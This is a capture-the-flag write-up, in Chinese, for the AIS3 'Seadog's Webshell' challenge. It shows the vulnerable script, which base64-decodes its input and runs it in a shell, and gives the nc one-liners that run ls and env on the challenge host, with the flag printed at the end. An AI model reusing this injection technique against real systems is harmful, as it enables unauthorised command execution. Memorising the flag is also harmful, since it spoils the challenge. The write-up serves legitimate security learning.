# Seadog's Webshell
## 題目
![image](https://user-images.githubusercontent.com/57281249/168675551-456344b7-b571-4a41-8150-e690d4daad11.png)

![image](https://user-images.githubusercontent.com/57281249/168675613-e4cab9ef-526e-44ee-be20-c55ed900b7ef.png)

## Important Source Code
``` bash
#!/bin/sh

exec 2>/dev/null
base64 | timeout 10s sh

```

## 解題
送進去的 code 必須同時符合 base64 的格式將其解碼送進去，因此 script 就用 `echo "//bin/ls" | base64 -d` 然後再 pipe 進 nc，並且用絕對路徑，這樣就可以用 `/` 填空位。
然而卻發現怎麼試都沒反應，因此用自己機器試了一下，發現 nc 沒送 eof，所以加了個 `-q 1`。
``` bash
echo "//bin/ls" | base64 -d | nc -q 1 chals1.ais3.org 12369
```

![image](https://user-images.githubusercontent.com/57281249/168675770-9f22fdf6-eae4-4747-8afe-e90b71ccc9f6.png)

成功

最後因為 flag 在 environment (根據 docker-ccompose.yml) 所以執行

``` bash
echo "/usr/bin/env" | base64 -d | nc -q 1 chals1.ais3.org 12369
```

![image](https://user-images.githubusercontent.com/57281249/168675828-91d4687e-ce81-4802-911d-45dc6a5c455c.png)

## Flag
`AIS3{ZXNjYXBpbmdfYmFzZTY0X3dpdGhfZW9m}`
